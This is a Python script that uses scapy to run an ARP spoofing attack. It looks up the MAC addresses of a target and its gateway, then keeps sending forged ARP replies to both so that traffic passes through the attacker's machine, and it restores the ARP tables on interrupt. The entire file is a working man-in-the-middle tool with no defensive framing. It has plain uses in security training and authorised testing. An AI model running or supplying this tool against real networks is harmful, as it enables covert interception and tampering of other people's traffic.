import scapy.all as scapy
import time
import sys
import signal
import os

# Add project root to sys.path for imports
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

from ATTACK.utils.logger import log


def get_mac(ip):
    """
    Returns the MAC address of `ip`, if it is up.
    """
    from scapy.layers.l2 import ARP, Ether
    from scapy.sendrecv import srp

    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if len(answered_list) == 0:
        return None
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends an ARP reply to `target_ip` telling it that we are `spoof_ip`.
    """
    from scapy.layers.l2 import ARP
    from scapy.sendrecv import send

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, source_ip, destination_mac, source_mac):
    """
    Restores the normal ARP table by sending the correct ARP replies.
    """
    from scapy.layers.l2 import ARP
    from scapy.sendrecv import send

    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    send(packet, count=4, verbose=False)


def signal_handler(sig, frame):
    global target_ip, gateway_ip, target_mac, gateway_mac
    log(
        "\n[!] Detected CTRL+C ! Restoring the network...",
        level="warning",
        to_console=True,
        to_file=True,
    )
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    log("[+] Network restored. Exiting.", level="info", to_console=True, to_file=True)
    sys.exit(0)


def main(args=None):
    import sys
    global target_ip, gateway_ip, target_mac, gateway_mac
    if args is None:
        args = sys.argv[1:]
    if len(args) != 2:
        log(
            "Usage: python3 index.py <target_ip> <gateway_ip>",
            level="error",
            to_console=True,
            to_file=True,
        )
        sys.exit(1)

    target_ip = args[0]
    gateway_ip = args[1]

    log(
        f"[+] Getting MAC address for target {target_ip}...",
        level="info",
        to_console=True,
        to_file=True,
    )
    target_mac = get_mac(target_ip)
    if target_mac is None:
        log(
            f"[-] Could not find MAC address for target {target_ip}. Exiting.",
            level="error",
            to_console=True,
            to_file=True,
        )
        sys.exit(1)
    log(f"[+] Target MAC: {target_mac}", level="info", to_console=True, to_file=True)

    log(
        f"[+] Getting MAC address for gateway {gateway_ip}...",
        level="info",
        to_console=True,
        to_file=True,
    )
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        log(
            f"[-] Could not find MAC address for gateway {gateway_ip}. Exiting.",
            level="error",
            to_console=True,
            to_file=True,
        )
        sys.exit(1)
    log(f"[+] Gateway MAC: {gateway_mac}", level="info", to_console=True, to_file=True)

    signal.signal(signal.SIGINT, signal_handler)

    log(
        "[*] Starting ARP spoofing. Press CTRL+C to stop and restore the network.",
        level="info",
        to_console=True,
        to_file=True,
    )
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        signal_handler(None, None)


if __name__ == "__main__":
    main()
